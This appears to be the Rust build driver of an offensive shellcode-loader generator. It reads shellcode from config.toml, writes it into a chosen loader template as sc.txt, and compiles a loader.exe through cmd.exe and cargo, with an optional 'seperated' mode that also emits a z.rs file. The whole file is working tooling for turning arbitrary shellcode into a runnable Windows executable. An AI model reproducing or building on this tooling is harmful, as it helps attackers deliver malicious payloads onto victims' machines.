use serde::Deserialize;
use std::fs::read_to_string;
use std::io::Write;
use std::path::PathBuf;

use std::process;
use toml;

#[derive(Deserialize, Debug)]
pub struct Config {
    seperated: bool,
    loader: String,
    shellcode: String,
}

fn load_config() -> Config {
    let cwd = std::env::current_dir().unwrap();
    let config_path = cwd.join("config.toml");
    if let Ok(c) = read_to_string(config_path) {
        let config: Config = toml::from_str(&c).unwrap();
        config
    } else {
        panic!("Failed to read config.toml")
    }
}

pub fn init() -> (PathBuf, Config) {
    let cwd = std::env::current_dir().unwrap();
    let config = load_config();

    let loader = config.loader.clone();
    let loader_path = cwd.join("loaders").join(&loader);
    if !loader_path.exists() {
        eprintln!("Loader {} not found in loaders directory", loader);
        std::process::exit(1);
    }

    let sc_path = loader_path.join("sc.txt");
    // create new file of sc_path
    let mut file = std::fs::File::create(&sc_path).unwrap();
    // write some data to the file
    file.write_all(config.shellcode.as_bytes()).unwrap();
    // close the file
    file.flush().unwrap();

    (loader_path, config)
}

pub fn work(d: (PathBuf, Config)) {
    let (wd, config) = d;
    let previous_wd = std::env::current_dir().unwrap();
    std::env::set_current_dir(&wd).unwrap();

    println!("[*] 正在构建子项目");
    process::Command::new("cmd.exe")
        .args(&[
            "/C",
            "cargo.exe",
            "run",
            "--package",
            &config.loader,
            "--bin",
            &config.loader,
        ])
        .output()
        .unwrap();

    if config.seperated {
        println!("[*] 已启用 seperated");
        process::Command::new("cmd.exe")
            .args(&[
                "/C",
                "cargo.exe",
                "build",
                "--features",
                "seperated",
                "--bin",
                "loader",
                "--release",
            ])
            .output()
            .unwrap();
    } else {
        process::Command::new("cmd.exe")
            .args(&[
                "/C",
                "cargo.exe",
                "build",
                "--package",
                &config.loader,
                "--bin",
                "loader",
                "--release",
            ])
            .output()
            .unwrap();
    };

    std::env::set_current_dir(previous_wd).unwrap();

    let target_path = wd.join("target").join("release").join("loader.exe");
    std::fs::copy(&target_path, "loader.exe").unwrap();
    if config.seperated {
        let target_path = wd.join("src").join("z.rs");
        std::fs::copy(&target_path, "z.rs").unwrap();
        println!("[+] z.rs 已在当前目录生成");
    }
    println!("[+] loader.exe 已在当前目录生成");
}
